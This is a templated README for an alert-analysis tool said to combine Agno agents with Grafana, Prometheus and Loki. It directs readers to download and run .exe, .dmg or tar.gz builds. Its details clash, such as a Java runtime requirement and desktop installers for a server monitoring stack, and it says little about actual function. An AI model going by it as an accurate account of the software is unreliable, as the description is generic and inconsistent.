🚀 agente-admin-observabilidad - Analyze Alerts Effortlessly

🛠️ Overview

The agente-admin-observabilidad application provides an automated alert analysis system using the Agno Framework and Grafana Stack. This software integrates multiple components, including WatchdogAgent, TriageAgent, and ReportAgent, to deliver real-time observability.

🌟 Features

  • Real-time Alert Analysis: Quickly analyze alerts to prevent issues.
  • Multi-Agent System: Use several agents working together for better insights.
  • Simple Commands: Execute quick commands for observability.
  • Custom Dashboards: Use Grafana to visualize your data effectively.
  • Support for Prometheus and Loki: Integrate seamlessly with these powerful monitoring tools.

⚙️ System Requirements

Before downloading, ensure your system meets these requirements:

  • Operating System: Windows 10, macOS, or a recent version of Linux.
  • Memory: At least 4 GB of RAM.
  • Disk Space: 500 MB free disk space.
  • Software Prerequisites:
    • Java Runtime Environment (JRE) 8 or later for running the application.
    • Grafana installed for effective visualizations.

📥 Download & Install

To get started, visit this page to download: Latest Releases.

  1. Click on the link above to open the Releases page.
  2. Find the latest version of agente-admin-observabilidad.
  3. Look for the appropriate file for your operating system:
    • For Windows: Download the .exe file.
    • For macOS: Download the .dmg file.
    • For Linux: Download the .tar.gz file.
  4. Click on the link to download the file to your computer.
  5. Once downloaded, locate the file and follow the instructions below for the installation process.

📈 Installation Steps

Windows

  1. Double-click the downloaded .exe file.
  2. Follow the prompts to complete the installation.
  3. Once installed, you can find the application in your Start menu.

macOS

  1. Open the downloaded .dmg file.
  2. Drag the agente-admin-observabilidad icon to your Applications folder.
  3. Go to your Applications folder and double-click on the app to launch it.

Linux

  1. Open a terminal.
  2. Navigate to the directory where you downloaded the .tar.gz file.
  3. Extract the files using the command: 
    tar -xzf agente-admin-observabilidad.tar.gz
  4. Change to the newly created directory: 
    cd agente-admin-observabilidad
  5. Run the application using: 
    ./start.sh

🔍 Usage Instructions

  1. Launch the application from your device.
  2. You will see an easy-to-follow interface designed for users of all skill levels.
  3. Set up your alerts and let the application analyze them.
  4. Use the built-in commands to quickly access metrics and reports.
  5. Integrate with Grafana to visualize your data effectively.
